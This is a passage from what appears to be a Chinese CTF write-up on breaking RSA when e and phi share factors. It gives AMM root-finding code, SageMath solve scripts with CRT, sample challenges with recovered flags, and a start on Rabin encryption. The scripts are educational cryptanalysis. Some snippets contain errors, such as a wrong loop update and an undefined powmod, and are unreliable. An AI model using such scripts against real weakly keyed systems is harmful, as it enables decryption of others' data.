class="built_in">pow</span>(c,r*j,p) % p</span><br><span class="line">        h = h*<span class="built_in">pow</span>(c,j) % p</span><br><span class="line">        c = <span class="built_in">pow</span>(c,r,p)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(delta,alpha,p) * h % p</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ALL_ROOT2</span>(<span class="params">r, q</span>):  <span class="comment"># use function set() and .add() ensure that the generated elements are not repeated</span></span><br><span class="line">    li = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">len</span>(li) &lt; r):</span><br><span class="line">        p = <span class="built_in">pow</span>(random.randint(<span class="number">1</span>, q-<span class="number">1</span>), (q-<span class="number">1</span>)//r, q)</span><br><span class="line">        li.add(p)</span><br><span class="line">    <span class="keyword">return</span> li</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_all_root</span>(<span class="params">x0,p,li</span>):</span><br><span class="line">    roots = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> li:</span><br><span class="line">        root = (x0*i) % p</span><br><span class="line">        roots.append(root)</span><br><span class="line">    <span class="keyword">return</span>  roots</span><br><span class="line">c = <span class="number">2252456587771662978440183865248648532442503596913181525329434089345680311102588580009450289493044848004270703980243056178363045412903946651952904162045861994915982599488021388197891419171012611795147125799759947942753772847866647801312816514803861011346523945623870123406891646751226481676463538137263366023714001998348605629756519894600802504515051642140147685496526829541501501664072723281466792594858474882239889529245732945</span></span><br><span class="line">p = <span class="number">5220649501756432310453173296020153841505609640978826669340282938895377093244978215488158231209243571089268416199675077647719021740691293187913372884975853901554910056350739745148711689601574920977808625399309470283</span></span><br><span class="line">q = <span class="number">7286645200183879820325990521698389973072307061827784645416472106180161656047009812712987400850001340478084529480635891468153462119149259083604029658605921695587836792877281924620444742434168448594010024363257554563</span></span><br><span class="line">r = <span class="number">1009</span></span><br><span class="line">delta1 = c % p</span><br><span class="line">x0 = exAMM(delta1,r,p)</span><br><span class="line">li1 = ALL_ROOT2(r,p)</span><br><span class="line">roots1 = find_all_root(x0,p,li1)</span><br><span class="line">delta2 = c % q</span><br><span class="line">x1 = exAMM(delta2,r,q)</span><br><span class="line">li2 = ALL_ROOT2(r,q)</span><br><span class="line">roots2 = find_all_root(x1,q,li2)</span><br><span class="line"><span class="built_in">print</span>(roots1)</span><br><span class="line"><span class="built_in">print</span>(roots2)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="built_in">len</span>(roots1)),leave=<span class="literal">True</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(roots2)):</span><br><span class="line">        <span class="comment"># 除数p、q</span></span><br><span class="line">        M = p*q</span><br><span class="line">        m1 = q</span><br><span class="line">        m2 = p</span><br><span class="line">        m1_ = gmpy2.invert(m1,p)</span><br><span class="line">        m2_ = gmpy2.invert(m2,q)</span><br><span class="line">        m = (m1*m1_*roots1[i] + m2*m2_*roots2[j]) % M</span><br><span class="line">        flag = long_to_bytes(m)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;NSSCTF&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;NSSCTF&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># b&quot;NSSCTF&#123;ee5cb1a5-9d62-257a-9ef5-48b06ff0651a&#125;\xbc\xbaw\xfe\xb8\x04A\x8es\xdct#\x1a\x91\x82\xbd\x0f\xfc&lt;\xc4\xb0$\x01\xd0\xc8/\xd9d#\x9baf=\xf1\xfd\xde&#x27;\x0e=\xcfX\xd1\xdbM\x9f\xba\xaf\x8a\xb9\xf0\xd7\xaa&#123;\xbf`:DY\xf5|\x11_R\x92\xa1\x9d\xc81\x12\xe9`\x17\xe3\n@K\\\xa5\x1f\xa7?\xdb\xf7p\x8aH\xba(\x02\xad\xf8n\xbe\xea\xcdTu\xac\xc4\xa1&quot;</span></span><br></pre></td></tr></table></figure><ul><li>sagemath版本：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line">c = <span class="number">2252456587771662978440183865248648532442503596913181525329434089345680311102588580009450289493044848004270703980243056178363045412903946651952904162045861994915982599488021388197891419171012611795147125799759947942753772847866647801312816514803861011346523945623870123406891646751226481676463538137263366023714001998348605629756519894600802504515051642140147685496526829541501501664072723281466792594858474882239889529245732945</span></span><br><span class="line">p = <span class="number">5220649501756432310453173296020153841505609640978826669340282938895377093244978215488158231209243571089268416199675077647719021740691293187913372884975853901554910056350739745148711689601574920977808625399309470283</span>   </span><br><span class="line">q = <span class="number">7286645200183879820325990521698389973072307061827784645416472106180161656047009812712987400850001340478084529480635891468153462119149259083604029658605921695587836792877281924620444742434168448594010024363257554563</span></span><br><span class="line">r = <span class="number">1009</span></span><br><span class="line">c1 = c % p</span><br><span class="line">c2 = c % q</span><br><span class="line">Zmn = Zmod(p) <span class="comment"># 创建一个模p的整数环</span></span><br><span class="line">Zmn2 = Zmod(q)</span><br><span class="line"><span class="comment"># 在模p的整数环下求 x^r = c 的根，也就是x^p = c mod(p)满足该式子的未知数x</span></span><br><span class="line"><span class="comment"># all = True表示要求出所有解，而all = false则表示不需要求出所有解</span></span><br><span class="line">x_list = Zmn(c1).nth_root(r,<span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">y_list = Zmn2(c2).nth_root(r,<span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#print(y_list)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="built_in">len</span>(x_list)),leave = <span class="string">&#x27;True&#x27;</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(y_list)):</span><br><span class="line">        m_ = [x_list[i],y_list[j]]</span><br><span class="line">        p_ = [p,q]</span><br><span class="line">        result = CRT(m_,p_)</span><br><span class="line">        flag = long_to_bytes(result)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;NSSCTF&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;NSSCTF&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h1 id="情况4p-1和q-1与e均不互素">情况4—(p-1)和(q-1)与e均不互素</h1><ul><li>对于<code>e</code>与<code>phi</code>不互素来说通解其实都是有限域开根，但是对于这种情况，<code>e</code>与<code>p-1和q-1</code>均不互素并且<code>p-1和q-1</code>都不是<code>r</code>的倍数，那AMM算法适用的条件就失效了。</li><li>但是思路还是有限域开根，这里直接使用<code>sagemath</code>一把梭，对于sagemath有限元两种开根方式，看sagemath一把梭部分。</li></ul><h2 id="例题">例题</h2><ul><li>题目来源：<a href="https://www.cnblogs.com/SevensNight/p/18764988">e与(p-1)或(q-1)均不互素 - sevensnight - 博客园</a></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"> </span><br><span class="line">e = <span class="number">0x14</span></span><br><span class="line">p = <span class="number">733089589724903586073820965792963746076789390539824437962807679954808310072656817423828613938510684864567664345751164944269489647964227519307980688068059059377123391499328155025962198363435968318689113750910755244276996554328840879221120846257832190569086861774466785101694608744384540722995426474322431441</span></span><br><span class="line">q = <span class="number">771182695213910447650732428220054698293987458796864628535794956332865106301119308051373568460701145677164052375651484670636989109023957702790185901445649197004100341656188532246838220216919835415376078688888076677350412398198442910825884505318258393640994788407100699355386681624118606588957344077387058721</span></span><br><span class="line">n = p*q</span><br><span class="line"> </span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#406314720119562590605554101860453913891646775958515375190169046313074168423687276987576196367702523895650602252851191274766072774312855212771035294337840170341052016067631007495713764510925931612800335613551752201920460877432379214684677593342046715833439574705829048358675771542989832566579493199671622475225225451781214904100440695928239014046619329247750637911015313431804069312072581674845078940868349474663382442540424342613429896445329365750444298236684237769335405534090013035238333534521759502103604033307768304224154383880727399879024077733935062478113298538634071453067782212909271392163928445051705642</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = <span class="number">733089589724903586073820965792963746076789390539824437962807679954808310072656817423828613938510684864567664345751164944269489647964227519307980688068059059377123391499328155025962198363435968318689113750910755244276996554328840879221120846257832190569086861774466785101694608744384540722995426474322431441</span></span><br><span class="line">q = <span class="number">771182695213910447650732428220054698293987458796864628535794956332865106301119308051373568460701145677164052375651484670636989109023957702790185901445649197004100341656188532246838220216919835415376078688888076677350412398198442910825884505318258393640994788407100699355386681624118606588957344077387058721</span></span><br><span class="line">n = p*q</span><br><span class="line">c = <span class="number">406314720119562590605554101860453913891646775958515375190169046313074168423687276987576196367702523895650602252851191274766072774312855212771035294337840170341052016067631007495713764510925931612800335613551752201920460877432379214684677593342046715833439574705829048358675771542989832566579493199671622475225225451781214904100440695928239014046619329247750637911015313431804069312072581674845078940868349474663382442540424342613429896445329365750444298236684237769335405534090013035238333534521759502103604033307768304224154383880727399879024077733935062478113298538634071453067782212909271392163928445051705642</span></span><br><span class="line">e = <span class="number">0x14</span></span><br><span class="line">Zmn = Zmod(p) <span class="comment"># 创建一个模p的整数环</span></span><br><span class="line">Zmn2 = Zmod(q)</span><br><span class="line"><span class="comment"># 在模p的整数环下求 x^r = c 的根，也就是x^p = c mod(p)满足该式子的未知数x</span></span><br><span class="line"><span class="comment"># all = True表示要求出所有解，而all = false则表示不需要求出所有解</span></span><br><span class="line">x_list = Zmn(c).nth_root(e,<span class="built_in">all</span> = <span class="literal">True</span>)</span><br><span class="line">y_list = Zmn2(c).nth_root(e,<span class="built_in">all</span> = <span class="literal">True</span>)</span><br><span class="line"><span class="comment">#print(x_list)</span></span><br><span class="line"><span class="comment">#print(y_list)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="built_in">len</span>(x_list)),leave=<span class="literal">True</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(y_list)):</span><br><span class="line">        c_ = [<span class="built_in">int</span>(x_list[i]),<span class="built_in">int</span>(y_list[j])]</span><br><span class="line">        m = [p,q]</span><br><span class="line">        x = CRT(c_,m)</span><br><span class="line">        f = long_to_bytes(x)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> f:</span><br><span class="line">            <span class="built_in">print</span>(f)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> f:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;r54__d34l1n6_w17h_3v3n_3 _&amp;_f1nd1n6_n-7h_r0075~~&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="情况5nprq的情况">情况5—n=p^r*q的情况</h1><ul><li>对于这种情况来说处理方式还是一样的去求根。</li></ul><h2 id="例题">例题</h2><ul><li>题目来源：<code>2023年香山杯-list</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">s,l</span>):</span><br><span class="line">    <span class="keyword">return</span> s + os.urandom(l - <span class="built_in">len</span>(s))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen</span>():</span><br><span class="line">    g = getPrime(<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = g * random.getrandbits(<span class="number">138</span>) + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(p):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        q = g * random.getrandbits(<span class="number">138</span>) + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(q):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    N = p ** <span class="number">5</span> * q</span><br><span class="line">    phi = p ** <span class="number">4</span> * (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    d = random.getrandbits(<span class="number">256</span>)</span><br><span class="line">    e = inverse(d, phi)</span><br><span class="line">    E = e * g</span><br><span class="line">    hint = gmpy2.gcd(E, phi)</span><br><span class="line">    <span class="keyword">return</span> N, E, hint</span><br><span class="line"></span><br><span class="line">flag = pad(flag,<span class="number">64</span>)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">n,e,hint = gen()</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;hint = <span class="subst">&#123;hint&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e = <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># hint = 251</span></span><br><span class="line"><span class="comment"># n = 108960799213330048807537253155955524262938083957673388027650083719597357215238547761557943499634403020900601643719960988288543702833581456488410418793239589934165142850195998163833962875355916819854378922306890883033496525502067124670576471251882548376530637034077</span></span><br><span class="line"><span class="comment"># e = 3359917755894163258174451768521610910491402727660720673898848239095553816126131162471035843306464197912997253011899806560624938869918893182751614520610693643690087988363775343761651198776860913310798127832036941524620284804884136983215497742441302140070096928109039</span></span><br><span class="line"><span class="comment"># c = 72201537621260682675988549650349973570539366370497258107694937619698999052787116039080427209958662949131892284799148484018421298241124372816425123784602508705232247879799611203283114123802597553853842227351228626180079209388772101105198454904371772564490263034162</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="总结">总结</h1><h2 id="通解">通解</h2><ul><li>对于情况1和情况2，这两种情况太特殊不具有一般性。在很多情况下不能使用情况1和情况2的方法。</li><li>对于<code>e</code>和<code>phi</code>不互素的情形以及以后遇到的各种变形情况，需要牢牢抓住有限域开根与CRT配合这条思路，基本上这类题型换汤不换药。</li><li>还有就是这类问题本质上就是使用<strong>算法的方式</strong>求第一类的高次同余式，如下图所示：</li></ul><p><img src="/2025/08/08/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/RSA/RSA%E5%8A%A0%E5%AF%86%E4%B9%8Be%E5%92%8Cphi%E4%B8%8D%E4%BA%92%E7%B4%A0/image-20250809235317052.png" alt="image-20250809235317052"></p><ul><li>转化到<code>RSA</code>加密中其实就是去解如下高次同余方程：</li></ul><p>$$<br>x^r\equiv \delta~mod(~p) \Rightarrow m^e\equiv c~(mod~p)<br>$$</p><h2 id="amm板子">AMM板子</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choose_one</span>(<span class="params">r,p</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        rho = random.randint(<span class="number">1</span>,p)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">pow</span>(rho,(p-<span class="number">1</span>)//r,p) != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span>  rho</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exAMM</span>(<span class="params">delta,r,p</span>):</span><br><span class="line">    <span class="keyword">if</span> (p-<span class="number">1</span>) % r != <span class="number">0</span>: <span class="comment"># 检测整除</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">pow</span>(delta,(p-<span class="number">1</span>)//r,p) != <span class="number">1</span>: <span class="comment"># 检测N次剩余</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第一步、第二步: 先生成一个r次非剩余</span></span><br><span class="line">    rho = choose_one(r,p)</span><br><span class="line">    <span class="comment"># 第三步(1): 求t,s</span></span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    phi = p-<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> phi % r == <span class="number">0</span>:</span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line">        phi = (phi-<span class="number">1</span>)//r</span><br><span class="line">    s = (p-<span class="number">1</span>)//(r**t)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第三步(2): 计算最小的alpha,使得满足 s|r*alpha - 1</span></span><br><span class="line">    <span class="keyword">if</span> math.gcd(s,r) != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    k = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (s*k+<span class="number">1</span>) % r != <span class="number">0</span>:</span><br><span class="line">        k+=<span class="number">1</span></span><br><span class="line">    alpha = (s*k+<span class="number">1</span>)//r</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第三步(3): 初始化一些值,为循环做准备</span></span><br><span class="line">    a = <span class="built_in">pow</span>(rho,<span class="built_in">pow</span>(r,t-<span class="number">1</span>)*s,p)</span><br><span class="line">    b = <span class="built_in">pow</span>(delta,r*alpha-<span class="number">1</span>,p)</span><br><span class="line">    c = <span class="built_in">pow</span>(rho,s,p)</span><br><span class="line">    h = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,t):</span><br><span class="line">        d = <span class="built_in">pow</span>(b,<span class="built_in">pow</span>(r,t-<span class="number">1</span>-i),p)</span><br><span class="line">        <span class="keyword">if</span> d == <span class="number">1</span>:</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            j = -math.log(d,a) % r</span><br><span class="line">        b = b*<span class="built_in">pow</span>(c,r*j,p) % p</span><br><span class="line">        h = h*<span class="built_in">pow</span>(c,j) % p</span><br><span class="line">        c = <span class="built_in">pow</span>(c,r,p)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(delta,alpha,p) * h % p</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ALL_ROOT2</span>(<span class="params">r, q</span>):  <span class="comment"># use function set() and .add() ensure that the generated elements are not repeated</span></span><br><span class="line">    li = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">len</span>(li) &lt; r):</span><br><span class="line">        p = powmod(random.randint(<span class="number">1</span>, q-<span class="number">1</span>), (q-<span class="number">1</span>)//r, q)</span><br><span class="line">        li.add(p)</span><br><span class="line">    <span class="keyword">return</span> li</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_all_root</span>(<span class="params">x0,p,li</span>):</span><br><span class="line">    roots = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> li:</span><br><span class="line">        root = (x0*i) % p</span><br><span class="line">        roots.append(root)</span><br><span class="line">    <span class="keyword">return</span>  roots</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_nth_root</span>(<span class="params">c,e,p</span>):</span><br><span class="line">    x0 = exAMM(c,e,p)</span><br><span class="line">    li = ALL_ROOT2(e,p)</span><br><span class="line">    roots = find_all_root(x0,p,li)</span><br><span class="line">    <span class="keyword">return</span> roots</span><br></pre></td></tr></table></figure><h2 id="sagemath一把梭">sagemath一把梭</h2><ul><li>对于有限域开根，其实sagemath已经有对应的函数与方法了，其实还不止一种。接下来主要介绍sagemath中有限域开根的两中方式。所谓有限域开根其实在数论中就是求高次同余式$x^r= a~(mod~p)$的根，而在其他代数结构可能就不是指模意义下的求根了。</li><li>有了sagemath一把梭之后就不用<code>AMM</code>算法了，可以纯脚本小子哈哈哈，但是建议还是学一下AMM算法，都牢密码了，如果不是比赛的话认真学还是不错的。</li><li>方式一：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">41</span></span><br><span class="line">r = <span class="number">8</span></span><br><span class="line">c = <span class="number">10</span></span><br><span class="line">Zmn = Zmod(p) <span class="comment"># 创建一个模p的整数环</span></span><br><span class="line"><span class="comment"># 在模p的整数环下求 x^r = c 的根，也就是x^p = c mod(p)满足该式子的未知数x</span></span><br><span class="line"><span class="comment"># all = True表示要求出所有解，而all = false则表示不需要求出所有解</span></span><br><span class="line">x_list = Zmn(c).nth_root(r,<span class="built_in">all</span> = <span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(x_list)</span><br></pre></td></tr></table></figure><ul><li>方式二：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">41</span></span><br><span class="line">r = <span class="number">8</span></span><br><span class="line">c = <span class="number">10</span></span><br><span class="line">F = GF(p) <span class="comment"># 创建一个有限域F_p</span></span><br><span class="line">R.&lt;x&gt; = PolynomialRing(F) <span class="comment"># 在F上定义一个多项式环,其变量为x </span></span><br><span class="line">f = x^r - c <span class="comment"># 构造同余方程多项式</span></span><br><span class="line">f = f.monic() <span class="comment"># 转化为首一多项式</span></span><br><span class="line">x_list = f.roots() <span class="comment"># 有限域开方</span></span><br><span class="line"><span class="built_in">print</span>(x_list)</span><br></pre></td></tr></table></figure><p>注意：实际上求根其实只需要求一个根，之后使用如下定理在模方程下有：$X^r\equiv a~(mod~p)$，其中$x_0$是该方程的一个解，那么所有解的形式是：$x=x_0<em>g^{k</em>\frac{p-1}{r}}~mod(~p),k=0,1,…,r-1$，而这个<code>g</code>其实是一个生成元，满足$g^r\equiv1~(mod~p)$即可快速求出。这个其实在拓展<code>AMM</code>算法中有详细讲解。</p><h1 id="rabin加密算法">Rabin加密算法</h1><h2 id="加密算法">加密算法</h2><ul><li><p>参考博客：<a href="https://blog.csdn.net/vivid117/article/details/124784493">密码学之公钥密码体系（4）：Rabin公钥密码方案_rabin密码体制-CSDN博客</a></p></li><li><p><code>RSA</code>加密算法在<code>1977</code>年就已经出现了，但是<code>Rabin</code>加密算法其实是在<code>1979</code>年被提出。该加密算法是基于平方根计算难度的公钥密码体系，而<code>RSA</code>是基于大整数分解的公钥密码体系，这俩点需要区别开来。</p></li><li><p>但是为什么会在<code>RSA</code>加密中讲解<code>Rabin</code>加密算法呢？这是因为<code>Rabin</code>加密算法其实可以被看做是一个特殊的RSA加密算法，正常来说RSA加密的<code>e</code>一般都是选取<code>65537</code>，而<code>Rabin</code>加密算法基于平方根计算难度的公钥密码体系，所以<code>e</code>一般是选取<code>2</code>。</p></li><li><p>接下来就介绍一下<code>Rabin</code>加密算法：</p><ul><li>首先先生成两个大素数<code>p</code>、<code>q</code>，这俩个大素数最好都满足$p\equiv3~mod(~4),q\equiv3~(mod~4)$，这样会简化求平方根的计算（后面会提到）</li><li>然后计算模数<code>n=p*q</code></li><li>选取公钥<code>pk=n</code></li><li>选取私钥<code>sk=(p,q)</code></li></ul></li><li><p>加密过程：对消息<code>m</code>进行模平方运算，也就是$c\equiv m^2~(mod~n)$</p></li><li><p>解密过程如下（其实解密过程就是上面求解高次同余式方程的过程）：</p><ul><li>将$c\equiv m^2~(mod~n)$拆分成$m^2\equiv c~mod(~p),m^2\equiv c~(mod~q)$</li><li>求解同余方程的根$x^2\equiv c~mod(~p),x^2\equiv c~(mod~q)$，这里有一个问题<code>p、q</code>越大二次同余方程的这个根就越难找到。</li><li>所以在前面生成<code>p、q</code>有要求$p\equiv3~mod(~4),q\equiv3~(mod~4)$，这个其实就是用来化简求二次同余方程的这个过程。</li><li>如果满足$p\equiv3~mod(~4),q\equiv3~(mod~4)$，此时$x_1\equiv 